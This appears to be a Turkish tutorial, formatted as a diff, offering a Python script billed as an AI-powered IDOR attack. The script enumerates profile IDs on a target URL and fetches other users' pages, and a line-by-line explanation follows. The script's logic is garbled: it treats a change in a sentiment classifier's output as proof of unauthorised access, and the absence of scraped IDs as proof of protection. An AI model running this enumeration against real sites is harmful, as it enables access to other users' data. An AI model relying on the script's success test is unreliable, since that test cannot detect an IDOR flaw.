@@ -1,0 +1,84 @@
+Python Kullanarak Yapay Zekayla Insecure Direct Object References Saldırısı Yapmak
+Insecure Direct Object References saldırısı, web uygulamalarında kullanıcıların yetkisiz erişim sağlayabileceği nesnelere doğrudan referans verilmesi durumunda ortaya çıkan bir güvenlik açığıdır.  Bu saldırıyı yapmak için aşağıda pythonla yapay zekalı bir kod örneği verilmiştir:
+# Bu kod, Insecure Direct Object References saldırısı yapmak için Rıdvan Kaya tarafından üretilmiştir.
+# Bu kodu gerçek bir web sitesine karşı kullanmayınız. Bu, yasa dışı ve zararlı olabilir.
+# Bu kodu sadece eğitim amaçlı olarak kullanınız.
+# Gerekli kütüphaneleri içe aktaralım
+import requests
+import re
+import random
+# Hedef web sitesinin URL'sini tanımlayalım
+target_url = "http://example.com/profile.php?id="
+# Saldırı için kullanacağımız yapay zeka modelini yükleyelim
+from transformers import AutoModelForSequenceClassification, AutoTokenizer
+model = AutoModelForSequenceClassification.from_pretrained("bert-base-uncased-finetuned-sst-2-english")
+tokenizer = AutoTokenizer.from_pretrained("bert-base-uncased-finetuned-sst-2-english")
+# Yapay zeka modeline göre, bir web sayfasının duygusal tonunu belirleyen bir fonksiyon tanımlayalım
+def get_sentiment(text):
+  # Metni tokenize edelim
+  inputs = tokenizer(text, return_tensors="pt")
+  # Modelden tahmin alalım
+  outputs = model(**inputs)
+  # Tahmin sonucunu etikete çevirelim
+  labels = ["Negative", "Positive"]
+  label = labels[outputs.logits.argmax()]
+  # Etiketi döndürelim
+  return label
+# Rastgele bir kullanıcı ID'si oluşturalım
+user_id = random.randint(1, 100)
+# Hedef web sitesine istek gönderelim
+response = requests.get(target_url + str(user_id))
+# İstek başarılı ise
+if response.status_code == 200:
+  # Web sayfasının içeriğini alalım
+  content = response.text
+  # Web sayfasının duygusal tonunu belirleyelim
+  sentiment = get_sentiment(content)
+  # Web sayfasında bulunan diğer kullanıcı ID'lerini arayalım
+  other_ids = re.findall(r"profile\.php\?id=(\d+)", content)
+  # Eğer diğer kullanıcı ID'leri varsa
+  if other_ids:
+    # Diğer kullanıcı ID'lerini ekrana yazdıralım
+    print(f"Found other user IDs on the page: {', '.join(other_ids)}")
+    # Diğer kullanıcı ID'lerinden rastgele birini seçelim
+    other_id = random.choice(other_ids)
+    # Seçtiğimiz kullanıcı ID'si ile yeni bir istek gönderelim
+    new_response = requests.get(target_url + other_id)
+    # İstek başarılı ise
+    if new_response.status_code == 200:
+      # Yeni web sayfasının içeriğini alalım
+      new_content = new_response.text
+      # Yeni web sayfasının duygusal tonunu belirleyelim
+      new_sentiment = get_sentiment(new_content)
+      # Eğer yeni web sayfasının duygusal tonu, ilk web sayfasından farklı ise
+      if new_sentiment != sentiment:
+        # Saldırının başarılı olduğunu ekrana yazdıralım
+        print(f"Successfully accessed another user's profile with ID {other_id}")
+        print(f"The sentiment of the page changed from {sentiment} to {new_sentiment}")
+      # Eğer yeni web sayfasının duygusal tonu, ilk web sayfası ile aynı ise
+      else:
+        # Saldırının başarısız olduğunu ekrana yazdıralım
+        print(f"Failed to access another user's profile with ID {other_id}")
+        print(f"The sentiment of the page remained {sentiment}")
+    # İstek başarısız ise
+    else:
+      # Hata mesajı ekrana yazdıralım
+      print(f"Error: {new_response.status_code}")
+  # Eğer diğer kullanıcı ID'leri yoksa
+  else:
+    # Web sayfasının korunaklı olduğunu ekrana yazdıralım
+    print(f"The page is protected from Insecure Direct Object References attacks")
+# İstek başarısız ise
+else:
+  # Hata mesajı ekrana yazdıralım
+  print(f"Error: {response.status_code}")
+#Yazan Rıdvan Kaya
+Bu kod, Insecure Direct Object References saldırısı yapmak için pythonla yapay zekalı bir kod örneğidir. Bu saldırı, web uygulamalarında kullanıcıların yetkisiz erişim sağlayabileceği nesnelere doğrudan referans verilmesi durumunda ortaya çıkan bir güvenlik açığıdır. Bu kod, yapay zeka modelini kullanarak, web sayfalarının duygusal tonunu belirleyerek, saldırının başarılı olup olmadığını kontrol etmektedir. Bu kodun mantığını ve işlevselliğini adım adım açıklamak gerekirse:
+- Öncelikle, gerekli kütüphaneleri içe aktarıyoruz. Bunlar, istek göndermek için requests, metin işlemek için re, rastgele sayı üretmek için random ve yapay zeka modelini kullanmak için transformers kütüphaneleridir.
+- Sonra, hedef web sitesinin URL'sini tanımlıyoruz. Bu URL, kullanıcı ID'si olarak bir parametre alıyor. Bu parametre, saldırı için değiştirilebilir.
+- Daha sonra, yapay zeka modelini yüklüyoruz. Bu model, bir metnin olumlu veya olumsuz olduğunu tahmin edebilen bir sınıflandırma modelidir. Bu modeli, web sayfalarının duygusal tonunu belirlemek için kullanacağız.
+- Ardından, yapay zeka modeline göre, bir web sayfasının duygusal tonunu belirleyen bir fonksiyon tanımlıyoruz. Bu fonksiyon, metni tokenize ederek modele veriyor ve modelden çıkan tahmini bir etikete dönüştürüyor. Etiket, Olumsuz veya Olumlu olabilir.
+- Sonra, rastgele bir kullanıcı ID'si oluşturuyoruz. Bu ID, hedef web sitesine istek göndermek için kullanılacak.
+- Hedef web sitesine istek gönderiyoruz ve isteğin başarılı olup olmadığını kontrol ediyoruz. Eğer başarılı ise, web sayfasının içeriğini ve duygusal tonunu alıyoruz. Ayrıca, web sayfasında bulunan diğer kullanıcı ID'lerini arıyoruz. Eğer diğer kullanıcı ID'leri varsa, bunları ekrana yazdırıyoruz.
+- Diğer kullanıcı ID'lerinden rastgele birini seçiyoruz ve seçtiğimiz kullanıcı ID'si ile yeni bir istek gönderiyoruz. Eğer istek başarılı ise, yeni web sayfasının içeriğini ve duygusal tonunu alıyoruz. Eğer yeni web sayfasının duygusal tonu, ilk web sayfasından farklı ise, saldırının başarılı olduğunu ekrana yazdırıyoruz. Eğer yeni web sayfasının duygusal tonu, ilk web sayfası ile aynı ise, saldırının başarısız olduğunu ekrana yazdırıyoruz.
+- Eğer istek başarısız ise, hata mesajı ekrana yazdırıyoruz. Eğer diğer kullanıcı ID'leri yoksa, web sayfasının saldırıya karşı korunaklı olduğunu ekrana yazdırıyoruz.
